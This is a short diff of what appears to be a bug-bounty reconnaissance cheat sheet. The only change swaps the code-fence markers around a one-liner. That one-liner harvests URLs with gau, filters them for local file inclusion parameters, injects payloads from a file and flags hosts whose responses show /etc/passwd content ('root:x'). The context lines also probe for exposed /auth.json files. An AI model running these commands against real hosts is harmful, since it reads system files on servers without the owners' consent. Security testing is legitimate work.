@@ -166,9 +166,9 @@ cat sub.txt | httpx -path "/auth.json" -title -status-code -content-length -t 80
 for i in $(cat urls); do headi -url $i;done
 
 ### LFI hunting with payload file:
-'''
+,,,
 gau HOST | gf lfi | xargs -I% -P 25 sh -c 'while read payload; do url=$(echo "%" | qsreplace "$payload"); response=$(curl -s "$url"); echo "$response" | grep -q "root:x" && echo "VULN! $url"; done < payload.txt'
-'''
+,,,
 
 
 
